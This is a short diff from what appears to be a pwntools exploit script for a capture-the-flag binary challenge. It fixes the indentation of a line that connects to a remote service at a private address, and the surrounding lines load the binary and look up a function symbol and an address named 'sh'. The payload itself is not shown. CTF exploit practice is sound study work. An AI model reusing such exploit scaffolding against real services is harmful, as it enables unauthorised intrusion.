@@ -455,7 +455,7 @@ from pwn import *
 context.log_level = 'debug'
 # io = process('./pwn')
 if args.R:
-io = remote("192.168.41.241", 11000)
+    io = remote("192.168.41.241", 11000)
 elf = ELF('./pwn')
 sh = 0x0804C024
 fun2_addr = elf.symbols['fun2']
